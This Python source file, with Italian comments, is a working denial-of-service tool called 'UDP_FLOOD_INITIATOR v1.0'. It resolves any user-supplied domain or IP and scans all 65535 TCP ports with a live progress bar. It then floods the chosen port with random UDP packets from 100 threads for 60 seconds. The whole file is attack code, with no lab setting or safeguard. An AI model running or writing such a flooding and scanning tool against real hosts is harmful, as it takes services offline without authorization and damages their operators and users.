import socket
import time
import threading
import random
import os
import sys

# Colori in stile Terminale (ANSI escape codes)
class C:
    GREEN = '\033[92m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    END = '\033[0m'
    BOLD = '\033[1m'
    
# --- Configurazione Vettori (Statici) ---
DURATION = 60       # Durata dell'attacco in secondi
NUM_THREADS = 100   # Numero di thread concorrenti
PACKET_SIZE = 1024  # Dimensione del pacchetto (max 65507)

# MODIFICATO: Range di Scansione Esteso (Porte Well-Known IANA + Registered + Dynamic/Private)
SCAN_START_PORT = 1 
SCAN_END_PORT = 65535 # Scansiona fino alla porta 65535 (MAX)
TIMEOUT_SCAN = 1.5  # Timeout per la scansione delle porte in secondi
# ----------------------------------------

# NEW: Contatore e flag per la progress bar asincrona
ports_scanned_counter = 0
counter_lock = threading.Lock() # Lock per accesso sicuro al contatore
monitor_running = True          # Flag per controllare il thread del monitor

# ------------------------------------------------------------------
#                             MODULO DNS
# ------------------------------------------------------------------

def dns_lookup(target):
    """
    Tenta di risolvere un nome host in un indirizzo IP.
    Restituisce l'IP se la risoluzione ha successo, altrimenti None.
    """
    try:
        # Tenta di risolvere il nome host (o restituisce l'IP se è già un IP)
        target_ip = socket.gethostbyname(target)
        print(f"{C.GREEN}[RESOLVED] {C.END}Dominio '{target}' risolto in IP: {C.BOLD}{target_ip}{C.END}")
        return target_ip
    except socket.gaierror:
        # Errore nella risoluzione (Nome host non trovato, etc.)
        print(f"{C.RED}[ERROR] Impossibile risolvere il dominio/IP '{target}'. Controlla l'input.{C.END}")
        return None
    except Exception as e:
        print(f"{C.RED}[CRITICAL ERROR during DNS] {e}{C.END}")
        return None

# ------------------------------------------------------------------
#                             MODULO SCANNER
# ------------------------------------------------------------------

def update_progress_counter():
    """Incrementa il contatore delle porte scansionate in modo thread-safe."""
    global ports_scanned_counter
    with counter_lock:
        ports_scanned_counter += 1

def scan_port(target_ip, port, open_ports):
    """Tenta di connettersi ad una porta TCP per verificarne l'apertura."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT_SCAN)
    try:
        # Tenta la connessione. Se riesce, la porta è aperta
        sock.connect((target_ip, port))
        open_ports.append(port)
        # Visualizzazione immediata della porta trovata (con \n per andare su una nuova riga)
        sys.stdout.write(f"\r{C.GREEN}[+] {C.END}Porta Aperta Trovata: {port}           {C.END}\n")
        sys.stdout.flush()
    except:
        pass
    finally:
        sock.close()
        update_progress_counter() # Aggiorna il contatore qui

def progress_bar_monitor(total_ports, open_ports, start_scan_time, BAR_LENGTH):
    """Gestisce la visualizzazione della barra di caricamento in un thread separato."""
    global ports_scanned_counter
    global monitor_running
    
    while ports_scanned_counter < total_ports and monitor_running:
        elapsed = int(time.time() - start_scan_time)
        
        # Calcolo Progresso
        progress = (ports_scanned_counter / total_ports)
        
        # Disegno Barra
        filled_length = int(BAR_LENGTH * progress)
        bar = '#' * filled_length + '-' * (BAR_LENGTH - filled_length)
        percent = f"{progress * 100:.2f}"
        
        # Output dinamico
        sys.stdout.write(f"\r{C.YELLOW}[SCANNING] {C.END} [{bar}] {percent}% | Tempo: {elapsed:03d}s | Porte Trovate: {len(open_ports):03d} ")
        sys.stdout.flush()
        time.sleep(0.2) # Aggiorna la barra ogni 200ms

def tcp_port_scanner(target_ip):
    """Esegue la scansione multithread sulle porte nel range definito."""
    global ports_scanned_counter
    global monitor_running
    
    # Reset Globals
    ports_scanned_counter = 0 
    monitor_running = True
    
    total_ports = SCAN_END_PORT - SCAN_START_PORT + 1
    BAR_LENGTH = 50
    
    print(f"\n{C.BLUE}>>{C.END} {C.BOLD}TCP PORT SCANNER ATTIVO:{C.END} Analizzo {total_ports} porte ({SCAN_START_PORT}-{SCAN_END_PORT}) sul target {target_ip}...")
    
    open_ports = []
    scan_threads = []
    start_scan_time = time.time()
    
    # 1. Avvia il Monitor della Progress Bar in un thread Daemon
    t_monitor = threading.Thread(target=progress_bar_monitor, args=(total_ports, open_ports, start_scan_time, BAR_LENGTH), daemon=True)
    t_monitor.start()

    # 2. Crea e Avvia i thread di Scansione
    for port in range(SCAN_START_PORT, SCAN_END_PORT + 1):
        t = threading.Thread(target=scan_port, args=(target_ip, port, open_ports))
        scan_threads.append(t)
        t.start()
        
    # 3. Attendi che tutti i thread di scansione finiscano 
    # Questo è il blocco principale, ma la barra di caricamento continua ad aggiornarsi
    for t in scan_threads:
        t.join()
        
    # 4. Ferma il monitor e attendi l'ultimo aggiornamento
    monitor_running = False
    if t_monitor.is_alive():
        t_monitor.join() 

    final_time = int(time.time() - start_scan_time)
    
    # Assicurati che l'ultima visualizzazione della barra sia 100%
    filled_length = BAR_LENGTH
    bar = '#' * filled_length
    percent = "100.00"

    # Output finale
    if open_ports:
        # Sovrascrivi l'ultima riga della progress bar
        sys.stdout.write(f"\r{C.GREEN}[SCAN COMPLETE] [{bar}] {percent}% | Trovate {len(open_ports)} porte aperte ({final_time}s).{' ' * 20}\n{C.END}")
        print(f"{C.GREEN}{C.BOLD}Porte Aperte:{C.END} {sorted(open_ports)}")
    else:
        sys.stdout.write(f"\r{C.YELLOW}[SCAN COMPLETE] [{bar}] {percent}% | Nessuna porta aperta trovata in {final_time}s. Procedi con cautela.{' ' * 20}\n{C.END}")
        
    return open_ports

# ------------------------------------------------------------------
#                             MODULO ATTACCO
# ------------------------------------------------------------------

def init_sequence():
    """Mostra una sequenza di inizializzazione minimale."""
    print(f"\n{C.GREEN}{C.BOLD}UDP_FLOOD_INITIATOR v1.0{C.END}")
    time.sleep(0.1)
    print(f"{C.GREEN}STATUS: Initializing network stack...{C.END}")
    time.sleep(0.1)
    
def get_target_data():
    """Richiede Dominio/IP e Porta al utente con lookup DNS."""
    target_ip = None
    
    # 1. Richiesta Dominio/IP e risoluzione
    while target_ip is None:
        target_input = input(f"{C.GREEN}TARGET_HOST (Dominio o IP): {C.END}")
        if target_input:
            target_ip = dns_lookup(target_input) # Tenta di risolvere
        else:
            print(f"{C.RED}[ERROR] Input non valido.{C.END}")
        
    # Esegui lo scanner dopo aver ottenuto l'IP
    open_ports = tcp_port_scanner(target_ip)

    # 2. Richiesta Porta per l'attacco
    print(f"\n{C.BLUE}>>{C.END} {C.BOLD}SELEZIONE PORTA PER FLOOD{C.END}")
    
    while True:
        port_str = input(f"{C.GREEN}FLOOD_PORT (Suggerite: {open_ports if open_ports else 'Nessuna'}): {C.END}")
        try:
            port = int(port_str)
            if 1 <= port <= 65535:
                break
            else:
                print(f"{C.RED}[ERROR] Port out of range (1-65535).{C.END}")
        except ValueError:
            print(f"{C.RED}[ERROR] Invalid port format. Must be an integer.{C.END}")
            
    return target_ip, port

def flood_worker(target_ip, port, packet):
    """Funzione worker, mantiene il socket aperto per la durata."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < flood_worker.end_time:
            # Invia pacchetti UDP
            sock.sendto(packet, (target_ip, port))
    except Exception:
        pass
    finally:
        if 'sock' in locals():
             sock.close()

def udp_flood_multithreaded(target_ip, port, duration, num_threads, packet_size):
    print(f"\n{C.RED}{C.BOLD}--- ATTACK COMMENCED ---{C.END}")
    print(f"{C.YELLOW}VECTOR: UDP | TARGET: {target_ip}:{port} | DURATION: {duration}s{C.END}")
    
    payload = os.urandom(packet_size)
    flood_worker.end_time = time.time() + duration
    
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=flood_worker, args=(target_ip, port, payload))
        threads.append(t)
        t.start()
        
    animation = ["|", "/", "-", "\\"]
    start_time = time.time()
    
    while time.time() < flood_worker.end_time:
        elapsed = int(time.time() - start_time)
        remaining = int(flood_worker.end_time - time.time())
        sys.stdout.write(f"\r{C.GREEN}[{animation[elapsed % 4]}] {C.END}Active Threads: {threading.active_count()-1:03d} | Elapsed: {elapsed:02d}s | Remaining: {remaining:02d}s...")
        sys.stdout.flush()
        time.sleep(0.25)

    for t in threads:
        t.join()
        
    print(f"\r{C.GREEN}[OK] {C.BOLD}EXECUTION COMPLETE.{' ' * 70}{C.END}")
    print(f"{C.YELLOW}STATUS: {num_threads} threads terminated. Socket closed.{C.END}")

# --- Punto di Esecuzione Principale ---
if __name__ == "__main__":
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system('title UDP_FLOOD_INITIATOR v1.0' if os.name == 'nt' else '')
        init_sequence()
        
        # Sequenza: Prendi Dominio/IP -> Risolvi (se Dominio) -> Scansiona -> Prendi Porta (per flood)
        TARGET_IP, PORT = get_target_data()
        
        # Esegui l'attacco
        udp_flood_multithreaded(TARGET_IP, PORT, DURATION, NUM_THREADS, PACKET_SIZE)
        
    except KeyboardInterrupt:
        print(f"\n{C.RED}[ABORT] User interrupt. Terminating all processes.{C.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{C.RED}[CRITICAL ERROR] {e}{C.END}")
        sys.exit(1)